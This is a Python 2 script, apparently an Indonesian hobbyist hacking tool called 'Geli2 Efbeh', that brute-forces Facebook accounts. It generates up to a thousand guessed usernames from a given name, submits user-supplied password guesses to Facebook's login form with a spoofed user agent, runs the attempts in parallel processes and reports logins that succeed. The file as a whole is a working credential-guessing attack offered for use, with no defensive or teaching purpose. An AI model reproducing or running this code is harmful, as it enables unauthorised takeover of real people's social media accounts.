# -*- coding UTF-8 -*-
#  Author : Iqbal Dev
#  Tools : Geli2 Efbeh
#  Versi : 0.2

from brute import brute
from mechanize import Browser
from multiprocessing import Process
from useragents import baner, multi_ban, deviv, divev
import os, sys, time, cookielib, mechanize, subprocess
os.system('' if os.name == 'nt' else 'chmod +x *')
multi = []


dev = Browser()
cj = cookielib.LWPCookieJar()
dev.set_handle_robots(False)
dev.set_handle_redirect(True)
dev.set_cookiejar(cj)
dev.set_handle_equiv(True)
dev.set_handle_referer(True)
dev.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
log = "https://www.facebook.com/login.php?login_attempt=1"
# log1 = "https://m.facebook.com" 
# users = open("user.txt", "r").readlines()
users = []

def user_dev():
  try:
  	print multi_ban
  	us = raw_input("\033[96;1m {\033[97;1m@\033[96;1m}\033[92;1m Masukkan Nama Facebook, Conth:\033[96;1m lucinta\n\033[97;1m  ==> ")
  	jumlah = input("\n\033[96;1m\033[96;1m {\033[97;1m$\033[96;1m}\033[92;1m Jumlah User Yg Mau Di Crack\033[96;1m (Max=1000):\n\033[93;1m  ==> ")
  	san_dev = raw_input("\n\033[96;1m\033[96;1m {\033[97;1m$\033[96;1m}\033[92;1m Sandi Yg Munkin Digunkn, conth:\033[96;1m lucinta123\n\033[97;1m  ==> ")
  	# set password
  	if us == '' or us == ' ' or san_dev == '' or san_dev == ' ':
  		exit('\n \033[91;1m Jangan Kosong Lah Kamprett.. \n')
  	print '\n\033[95;1m<<\033[96;1m Proses Cracking Sedang Berjalan,Tunggu Ajh!\033[95;1m >> \n'
  	sandi1 = san_dev.replace(' ', '\n').replace(',', '\n').replace('/', '\n')
  	sandi = sandi1.replace('\n\n', '\n')
  	# set usernmae
  	userz = us.replace(' ', '.')
  	p = open("pass.txt", "w")
  	p.write(sandi)
  	p.close()
  	for has in range(1, jumlah+1):
  	  try:
  		users.append(userz+'.'+str(has))
  	  except:
  	  	pass
  except KeyboardInterrupt: 
  	exit("\033[91;1m \n Keluar... \n")
  except NameError:
  	exit('\n\033[91;1m Masukkan Angka Dodoll..\n')

def pro_dev(ival):
	pas = open("pass.txt", "r").readlines()
	iqbal = ival.replace('\n', '')
	for iq in pas:
	  try:
		iqu = iq.replace('\n', '').replace('\n\n', '') # print str(iqbal) + " | " + iqu 
		dev.addheaders = [('User-Agent', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14')]
		dev.open(log)
		dev.select_form(nr=0)
		dev.form['email'] = ival
		dev.form['pass'] = iqu
		sub = dev.submit()
		mask = sub.geturl()
		if mask != log and not 'login_attempt' in mask:
			print "\033[96;1m  [\033[92;1mSUC\033[96;1m] " +'\033[97;1m'+ iqbal + '\033[96;1m |\033[92;1m '+ iqu 
	  except:
	  	pass

def dev_id():
	for dev in users:
		pro = Process(target=pro_dev, args=(dev,))
		multi.append(pro)
		pro.start()

	for dev in multi:
		dev.join()

def run():
	th = Process(target=dev_id)
	th.start()
	th.join()
	divev()
	deviv()
	print "\n\033[97;1m     ==[ \033[96;1m Selesai......\033[97;1m  ]== \n"
if __name__ == '__main__':
	try:
		os.system('cls' if os.name == 'nt' else 'clear')
		print baner
		pil = raw_input("\033[96;1m {\033[95;1m?\033[96;1m}\033[92;1m Pilih Opsi\033[93;1m : ")
		if pil == '1':
			brute()
		elif pil == '2':
			user_dev()
			run()
		elif pil == '3':
			try:
				print " \n\n \033[97;1m        +++[ \033[96;1m Tools Versi 0.2 \033[97;1m ]+++" 
				print " \n               \033[93;1m Keunggulan:\n\n   \033[97;1m   Lebih Power Full dibanding yg V.01 \n      bisa mengisi lebih dari 1 password  \n"
				print " \n\033[95;1m   Silahkan Ikuti Instagram saya \033[96;1m(IqbalDev)"
				raw_input(" \033[97;1m    Tekan Enter Untuk Membuka Instagram..")
				subprocess.check_output(['am', 'start', 'https://www.instagram.com/iqbaldev/'])
				os.system('multi_dev.py' if os.name == 'nt' else 'python2 multi_dev.py')
			except KeyboardInterrupt:
				subprocess.check_output(['am', 'start', 'https://www.instagram.com/iqbaldev/'])
				os.system('multi_dev.py' if os.name == 'nt' else 'python2 multi_dev.py')
		else:
			print "\n\033[90;1m Pilih yang Bener lah Kampprett.. "
	except KeyboardInterrupt:
		exit("\n\033[90;1m Keluar... ")
